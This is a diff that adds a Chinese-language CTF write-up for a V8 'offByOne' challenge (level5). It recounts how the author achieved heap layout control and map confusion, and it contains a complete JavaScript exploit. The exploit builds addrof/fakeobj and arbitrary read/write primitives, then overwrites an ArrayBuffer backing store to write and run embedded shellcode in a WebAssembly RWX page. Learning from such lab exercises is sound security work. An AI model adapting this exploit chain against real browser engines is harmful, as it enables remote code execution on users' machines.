@@ -220,3 +220,113 @@ while(1){}
 过程中遇见了一个很无语的事。在我构造好addrof primitive后，能正常泄漏出wasm_instance的地址，但泄漏不出shellcode_buf的地址。调试了很久都不知道哪里有问题。去服务器搜了一下，发现其他人也有类似的问题，有时能行有时不能行，竟然属于正常现象。后面我修改了两者的泄漏顺序（最开始是先`addrof(wasm_instance)`再`addrof(shellcode_buf)`），奇迹般地跑起来了
 
 另外，环境好像变了。现在直接运行`sudo pwndbg`会提示没有PATH变量。用`sudo env PATH="$PATH" pwndbg`即可
+
+## level5
+
+感觉level4没什么新东西，于是这周再做一题
+
+这题的漏洞函数为`offByOne`，这下完全等于那篇看包浆的wp了。但这题多了一个额外的难点：仅double数组可以触发`offByOne`，object数组不行。因此无法像那篇wp一样直接泄漏object map，偏偏object map是最重要的内容之一
+
+数组一般遵循`elements | array object`的布局，意味着`offByOne`只能越界到自身数组的map。此时的我没有任何头绪，于是去社区服务器搜了一下相关内容。真的有人问过和我一样的问题，`kylebot1337`佬是这样回答的：
+```
+so, JSObject and elements are two different things 
+JSObject is of size 0x10
+when you do var a = [1.1, 2.2, 3.3]
+what actually happens is that it will allocate all the elements (1.1, 2.2, 3.3), and then finally allocate the JSObect
+so, normally on heap, you have elements | object
+that's why you thought you could only overflow into the double array itself
+but no
+what if you increase the number of elements?
+since there is no way to hold it in the original location, it has to be reallocated
+leading to this heap layout: old_elements | object | elements | victim
+```
+（虽然后面我好像没有完全按照这个思路写，因为不知道怎么搞，但是还是给了我启发）
+
+关键在于：
+1. 让elements跑到array object后面
+2. 让elements与victim object相邻
+
+第一点很简单，之前无意中发现过。用`var a=[1.1,1.2]`定义的话，元素在array object前面；但是用`var a=Array(1.1,1.2)`的话就跑到后面去了。第二点卡了我好一会，因为object数组好像不遵循我在double数组上发现的规律，用`Array`不改变元素与数组的先后顺序，或是中间会出现某些不知道的结构隔开victim和elements（不过后面好像反应过来这所谓“不知道的结构”究竟是什么东西了……但懒得重新调试确认）
+
+读了佬的提示好多遍，注意到`it will allocate all the elements (1.1, 2.2, 3.3), and then finally allocate the JSObect`。嗯？那我要是定义一个没有任何元素的数组，然后再往里面push一个object呢？没想到竟然成了，而且因为数组里只有一个object，其map确实是我想要的object map
+```js
+RWX_PAGE_OFFSET=0x2c16bn;
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+function shift32(i) {
+	return i << 32n;
+}
+function lowerhalf(i) {
+	return i % 0x100000000n;
+}
+var obj = {"A":1};
+var float_arr=Array(1.1,1.2);
+var obj_arr=[];
+obj_arr.push(obj);
+var obj_arr_map=ftoi(float_arr.offByOne());
+console.log(obj_arr_map);
+var oob=Array(1.1,1.2)
+var victim=[];
+victim.push(1.1,1.2);
+var float_victim_map = ftoi(oob.offByOne());
+console.log(float_victim_map);
+var arb_rw_arr = [itof(shift32(0x725n)+BigInt(float_victim_map)), 1.2];
+function addrof(in_obj) {
+    obj_arr[0] = in_obj;
+    float_arr.offByOne(itof(float_victim_map));
+    let addr = obj_arr[0];
+    float_arr.offByOne(itof(obj_arr_map));
+    return lowerhalf(ftoi(addr));
+}
+function fakeobj(addr) {
+    victim[0] = itof(addr);
+    oob.offByOne(itof(obj_arr_map));
+    let fake = victim[0];
+    oob.offByOne(itof(float_victim_map));
+    return fake;
+}
+function arb_read(addr) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
+    return ftoi(fake[0]);
+}
+function arb_write(addr, val) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
+    fake[0] = itof(BigInt(val));
+}
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
+let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
+let buf_addr = addrof(shellcode_buf);
+let wasm_addr=addrof(wasm_instance);
+console.log(wasm_addr);
+var rwx_page_addr = arb_read(wasm_addr+RWX_PAGE_OFFSET+1n);
+console.log(rwx_page_addr);
+console.log(buf_addr);
+let backing_store_addr = buf_addr + 0x24n;
+arb_write(backing_store_addr,rwx_page_addr);
+let dataview = new DataView(shellcode_buf);
+for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4 * i, shellcode[i], true);
+}
+f();
+while(1){}
+```
+一些踩过的坑：
+- `var obj = {"A":1};`的定义要在最上面，防止破坏接下来多个数组的布局。最开始我完全意识不到这点，放在float_arr和obj_arr之间定义。即使随便一个obj也是要占空间的，故会扰乱布局，隔开本来是相邻的两个结构
+- 提示里的`increase the number of elements`有点误导我，或者是我没读明白。我最开始的构想是定义一个`var a=[1.1]`，然后往里面push元素。我看过原本的布局，元素和数组object时间没有任何空间，所以push肯定会触发reallocation。实测发现它确实reallocate了，但是reallocate的数量不等于我push的数量，而是多分配了很多个元素的空间。估计是某种动态预分配机制
+- 了解到上一条后我还不死心，有了个更复杂的想法。定义一个object数组，其elements占用的内存正好等于预分配需要的最大空间。然后往object数组里push object，触发reallocation；最后再往double数组里push数字，同样触发reallocation。我以为触发reallocation后装之前的元素的内存就会被回收，就能被接下来的预分配占用了。首先垃圾处理器不是这么想的（并没有被回收），其次虽然说预分配了n个元素的位置，但offByOne看的是length，而预分配不会修改length
